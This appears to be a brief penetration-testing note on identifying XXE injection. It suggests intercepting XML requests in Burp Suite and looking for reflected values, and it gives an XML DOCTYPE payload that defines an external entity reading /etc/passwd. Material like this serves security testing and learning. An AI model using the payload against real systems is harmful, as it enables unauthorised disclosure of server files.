
### Identify

We can intercept request with Burp Suite and then see in the request if the data is being sent via XML

We can check in the response if we see any reflected values and if so it should be a good start on where to attempt injection


injecting xml entity for file disclosure
```xml
<!DOCTYPE email [
  <!ENTITY company SYSTEM "file:///etc/passwd">
]>
```

